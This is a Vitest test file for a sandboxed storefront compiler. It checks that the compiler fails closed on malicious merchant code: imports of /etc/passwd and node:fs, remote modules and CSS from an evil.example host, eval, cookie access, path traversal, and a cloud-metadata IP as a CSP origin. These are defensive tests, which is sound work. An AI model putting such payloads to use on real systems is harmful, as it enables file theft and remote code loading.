import { describe, expect, it } from 'vitest';
import { createOgabasseyStorefrontManifest } from '../benchmark/ogabassey-catalog-fixture';
import {
  buildCloudflareContainerCompilerProfile,
  buildRunscDockerCompilerProfile,
  deriveCompileSigkillTimeoutMs,
} from '../sandbox/container-profiles';
import {
  compileStorefrontWorker,
  StorefrontCompilerError,
} from './compile-storefront';

describe('compileStorefrontWorker sandbox & closed-graph enforcement', () => {
  it('compiles deterministically without executing merchant module code and enforces zero bindings', async () => {
    const manifest = createOgabasseyStorefrontManifest();
    manifest.files[manifest.files.length - 1] = {
      path: 'src/StorefrontApp.tsx',
      content: `
        if (typeof globalThis !== 'undefined' && (globalThis as Record<string, unknown>).__COMPILER_HOST__) {
          throw new Error('MUST_NOT_EXECUTE_AT_COMPILE_TIME');
        }
        export default function SafeApp() {
          return <main className="p-6"><h1 className="text-2xl font-bold">Deterministic Store</h1></main>;
        }
      `,
    };

    (globalThis as Record<string, unknown>).__COMPILER_HOST__ = true;
    try {
      const first = await compileStorefrontWorker(manifest);
      const second = await compileStorefrontWorker(manifest);

      expect(first.buildDigest).toBe(second.buildDigest);
      expect(first.sourceDigest).toBe(second.sourceDigest);
      expect(first.bindings).toEqual([]);
      expect(first.metrics.clientGzipBytes).toBeLessThanOrEqual(150 * 1024);
      expect(first.metrics.cssGzipBytes).toBeLessThanOrEqual(50 * 1024);
      expect(first.cssCode).toContain('.p-6');
      expect(first.cspGovernance.vettedOrigins).toContain(
        'https://www.googletagmanager.com'
      );
      expect(first.cspGovernance.unvettedOrigins).toEqual([]);
    } finally {
      delete (globalThis as Record<string, unknown>).__COMPILER_HOST__;
    }
  });

  it.each([
    [
      'node:fs builtin',
      'import fs from "node:fs"; export default function X(){return <p>{String(fs)}</p>;}',
    ],
    [
      'bare child_process builtin',
      'import cp from "child_process"; export default function X(){return <p>{String(cp)}</p>;}',
    ],
    [
      'cloudflare:sockets builtin',
      'import { connect } from "cloudflare:sockets"; export default function X(){return <p>{String(connect)}</p>;}',
    ],
    [
      'absolute host path /etc/passwd',
      'import secret from "/etc/passwd"; export default function X(){return <p>{String(secret)}</p>;}',
    ],
    [
      'parent path traversal ../',
      'import leak from "../../package.json"; export default function X(){return <p>{String(leak)}</p>;}',
    ],
    [
      'external HTTPS module',
      'import mod from "https://evil.example/payload.js"; export default function X(){return <p>{String(mod)}</p>;}',
    ],
    [
      'undeclared npm package',
      'import { z } from "zod"; export default function X(){return <p>{String(z)}</p>;}',
    ],
    [
      'eval() call',
      'export default function X(){ const x = eval("1+1"); return <p>{x}</p>; }',
    ],
    [
      'new Function() call',
      'export default function X(){ const fn = new Function("return 1"); return <p>{fn()}</p>; }',
    ],
    [
      'navigator.serviceWorker registration',
      'export default function X(){ navigator.serviceWorker.register("/sw.js"); return <p>sw</p>; }',
    ],
    [
      'document.cookie access',
      'export default function X(){ const c = document.cookie; return <p>{c}</p>; }',
    ],
    [
      'dangerouslySetInnerHTML usage',
      'export default function X(){ return <div dangerouslySetInnerHTML={{ __html: "<b>bad</b>" }} />; }',
    ],
  ])('fails closed on %s', async (_label, maliciousCode) => {
    const manifest = createOgabasseyStorefrontManifest();
    manifest.files = [
      { path: 'src/StorefrontApp.tsx', content: maliciousCode },
    ];

    await expect(compileStorefrontWorker(manifest)).rejects.toBeInstanceOf(
      StorefrontCompilerError
    );
  });

  it('allows ordinary product copy and comments mentioning prohibited imports, supports arbitrary Tailwind values, and resolves bare relative CSS @imports', async () => {
    const manifest = createOgabasseyStorefrontManifest();
    manifest.files = [
      {
        path: 'src/styles/colors.css',
        content: '.brand-pill { border-width: 2px; }',
      },
      {
        path: 'src/styles/theme.css',
        content: '@import "colors.css";',
      },
      {
        path: 'src/StorefrontApp.tsx',
        content: `
          // Example blocked in real code: import fs from "node:fs";
          import './styles/theme.css';
          export default function CopyApp() {
            const note = "Zero document.cookie tracking or import 'node:fs' tricks — pure edge commerce.";
            return (
              <main className="bg-[#316ff6] w-[calc(100%-2rem)] brand-pill">
                <h1>{note}</h1>
              </main>
            );
          }
        `,
      },
    ];

    const compiled = await compileStorefrontWorker(manifest);
    expect(compiled.workerCode).toContain('pure edge commerce');
    expect(compiled.cssCode).toContain('#316ff6');
    expect(compiled.cssCode).toContain('calc(100% - 2rem)');
    expect(compiled.cssCode).toContain('.brand-pill');
  });

  it('blocks malicious CSS @import, @plugin, and undeclared asset url() exfiltration', async () => {
    const base = createOgabasseyStorefrontManifest();

    const externalCssImport = structuredClone(base);
    externalCssImport.files[0] = {
      path: 'src/styles/theme.css',
      content: '@import url("https://evil.example/leak.css");',
    };
    await expect(compileStorefrontWorker(externalCssImport)).rejects.toThrow(
      /External @import URL forbidden/
    );

    const pluginDirective = structuredClone(base);
    pluginDirective.files[0] = {
      path: 'src/styles/theme.css',
      content: '@plugin "../../steal.js";',
    };
    await expect(compileStorefrontWorker(pluginDirective)).rejects.toThrow(
      /Forbidden @plugin/
    );

    const undeclaredAsset = structuredClone(base);
    undeclaredAsset.files[0] = {
      path: 'src/styles/theme.css',
      content: '.hero { background-image: url("/assets/not-declared"); }',
    };
    await expect(compileStorefrontWorker(undeclaredAsset)).rejects.toThrow(
      /Undeclared asset URL/
    );
  });

  it('flags unvetted HTTPS origins in cspGovernance and rejects wildcards or raw IP CSP origins', async () => {
    const manifest = createOgabasseyStorefrontManifest();
    manifest.cspAllowlist = {
      scriptOrigins: ['https://www.googletagmanager.com'],
      connectOrigins: ['https://api.custom-analytics.example'],
      imgOrigins: ['https://cdn.supplier-warehouse.example'],
    };

    const compiled = await compileStorefrontWorker(manifest);
    expect(compiled.cspGovernance.vettedOrigins).toEqual([
      'https://www.googletagmanager.com',
    ]);
    expect(compiled.cspGovernance.unvettedOrigins).toEqual([
      'https://api.custom-analytics.example',
      'https://cdn.supplier-warehouse.example',
    ]);

    const wildcardOrigin = structuredClone(manifest);
    wildcardOrigin.cspAllowlist.scriptOrigins = ['https://*.evil.example'];
    await expect(
      compileStorefrontWorker(wildcardOrigin)
    ).rejects.toBeInstanceOf(StorefrontCompilerError);

    const rawIpOrigin = structuredClone(manifest);
    rawIpOrigin.cspAllowlist.connectOrigins = ['https://169.254.169.254'];
    await expect(compileStorefrontWorker(rawIpOrigin)).rejects.toBeInstanceOf(
      StorefrontCompilerError
    );
  });

  it('enforces manifest path safety, 64-file cap, and host-specific container profile invariants', async () => {
    const badPath = createOgabasseyStorefrontManifest();
    badPath.files.push({
      path: '../escape.tsx',
      content: 'export const x = 1;',
    });
    await expect(compileStorefrontWorker(badPath)).rejects.toBeInstanceOf(
      StorefrontCompilerError
    );

    const tooManyFiles = createOgabasseyStorefrontManifest();
    for (let i = 0; i < 65; i++) {
      tooManyFiles.files.push({
        path: `src/extra/mod-${i}.ts`,
        content: `export const v${i} = ${i};`,
      });
    }
    await expect(compileStorefrontWorker(tooManyFiles)).rejects.toBeInstanceOf(
      StorefrontCompilerError
    );

    expect(deriveCompileSigkillTimeoutMs(420)).toBe(5000);
    expect(deriveCompileSigkillTimeoutMs(1500)).toBe(7500);

    const digest = `sha256:${'a'.repeat(64)}`;
    const runscProfile = buildRunscDockerCompilerProfile({
      imageDigest: digest,
      measuredP95Ms: 1200,
    });
    expect(runscProfile.dockerRunArgs).toContain('--network=none');
    expect(runscProfile.dockerRunArgs).toContain('--read-only');
    expect(runscProfile.sigkillTimeoutMs).toBe(6000);

    expect(() =>
      buildRunscDockerCompilerProfile({
        imageDigest: 'node:24-latest',
        measuredP95Ms: 500,
      })
    ).toThrow(/sha256 digest/);

    const cfContainer = buildCloudflareContainerCompilerProfile({
      instanceType: 'basic',
      measuredP95Ms: 800,
    });
    expect(cfContainer.outboundInternetEnabled).toBe(false);
    expect(cfContainer.memoryMiB).toBe(1024);
  });
});
